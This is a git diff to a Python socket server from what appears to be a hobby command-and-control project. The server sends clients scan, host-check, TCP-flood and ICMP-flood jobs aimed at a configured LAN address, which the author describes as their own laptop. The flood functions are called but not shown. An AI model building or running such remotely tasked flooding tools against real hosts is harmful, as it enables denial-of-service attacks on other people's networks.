@@ -1,7 +1,7 @@
 # INSTRUCTIONS:
 # 1) Change the SERVER const to match your machine's server
 # 2) Change TARGET_IP to match the IP where you can detect the packets
-# 3) run server.py first
+# 3) run server.py first (send only one job at a time to test each one individually)
 # 4) run client.py with administrator priviledges
 
 # JOBS:
@@ -16,6 +16,7 @@
 
 import socket
 import threading
+import time
 
 # Variables below are constants
 HEADER = 1024  # header describes the properties of the message that it comes with
@@ -26,9 +27,10 @@ server.bind((SERVER, PORT))  # passed as tuple
 FORMAT = 'utf-8'
 DISCONNECT_MSG = "!disconnect"
 # IP of my laptop so I can test on wireshark and see these packets
-TARGET_IP = '192.168.1.123'
-TARGET_IPBROADCAST = '192.168.1.123/24'
-TARGET_PORT = '80'
+TARGET_IP = '192.168.1.144'
+TARGET_IPBROADCAST = '192.168.1.144/24'  # will list all ips
+TARGET_PORT = '80'  # port num you're targeting
+TARGET_HOSTNAME = 'nouriddin'  # name of machine you want to check if it's online
 
 # function takes in a socket object and an address, this is unique to each client
 
@@ -58,10 +60,12 @@ def ClientHandler(addr, conn):
             # TODO: send this once (and wait until client has completed the job)
 
             # conn.send(LookupNetworkConn(TARGET_IPBROADCAST))  # WORKS!
-            # conn.send(IsIPOnline(TARGET_IP, 'none')) #WORKS!
-            # conn.send(IsIPOnline('none', 'nouriddin')) #WORKS!
-            # conn.send(TCPFlood(TARGET_IP, TARGET_PORT))  # WORKS!
+            # conn.send(IsIPOnline(TARGET_IP, 'none'))  # WORKS!
+            # conn.send(IsIPOnline('none', TARGET_HOSTNAME))  # WORKS!
+            # conn.send(TCPFlood(TARGET_IP, TARGET_PORT))  # TEST THIS ALONE AS IT ONLY STOPS WITH Ctrl+C
             conn.send(ICMPFlood(TARGET_IP))  # WORKS!
+            # tells client it's done and that it can disconnect
+            # conn.send(DISCONNECT_MSG.encode(FORMAT))
             if msg == DISCONNECT_MSG:  # if client asks to disconnect it will disconnect
                 connected = False
     conn.close()
